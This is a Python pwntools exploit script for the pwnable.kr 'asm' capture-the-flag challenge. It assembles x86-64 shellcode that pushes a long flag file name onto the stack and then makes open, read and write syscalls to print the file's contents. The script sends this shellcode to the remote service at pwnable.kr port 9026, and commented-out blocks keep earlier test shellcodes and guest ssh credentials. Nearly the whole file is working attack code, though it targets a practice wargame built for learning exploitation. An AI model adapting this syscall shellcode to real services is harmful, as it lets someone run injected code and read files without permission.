from pwn import *
context.clear(arch='amd64')
#context.log_level = 'debug'

# initial shellcode to read the name of asm.c, used for testing and only works on the binary inside /home/asm
'''shellcode = asm("""
push   0
mov    rbp, rsp
movabs rbx, 0x632e6d73612f6d
push   rbx
movabs rbx, 0x73612f656d6f682f
push   rbx
mov    rdi, rsp
xor    rsi, rsi
xor    rdx, rdx
mov    rax, 0x2
syscall
mov    rdi, rax
mov    rdx, 0x14
sub    rsp, 0x14
mov    rsi, rsp
xor    rax, rax
syscall
mov    rdi, 1
mov    rdx, rax
mov    rax, 1
syscall""")'''
# another test shellcode to test the ability to write to stdout
'''shellcode = asm("""
mov    rdx,0x5
movabs rbx,0x6f6c6c6568
push   rbx
mov    rsi,rsp
mov    rdi,0x1
mov    rax,0x1
syscall
""")'''

exploit = """
push 0
mov rbp, rsp
\n"""
pushes = []
string = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
n=8
chunks = [string[i:i+n] for i in range(0, len(string), n)]
little_chunks = []
for chunk in chunks:
    num = ""
    for c in chunk:
        num = num + hex(ord(c))[2:]
    ba = bytearray.fromhex(num)
    ba.reverse()
    s = ''.join(format(x, '02x') for x in ba)
    little_chunks.append(s.upper())
little_chunks.reverse()
for chunk in little_chunks:
    exploit += f"mov rbx, 0x{chunk}\npush rbx\n"
exploit += """
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall
mov rdi, rax
mov rdx, 0x20 # flag len is 32
sub rsp, 0x20
mov rsi, rsp
xor rax, rax
syscall
mov rdi, 1
mov rdx, rax
mov rax, 1
syscall
"""


shellcode = asm(exploit)


print(disasm(shellcode))
#r = ssh(host="pwnable.kr", user="asm", password="guest", port=2222)
#p = r.remote("0", 9026)
p = remote("pwnable.kr", 9026)
print(p.recvuntil("shellcode: ").decode())
print("[*] sending shellcode...")
p.send(shellcode)
#time.sleep(2)
print("[*] response:")
print(p.recv().decode())
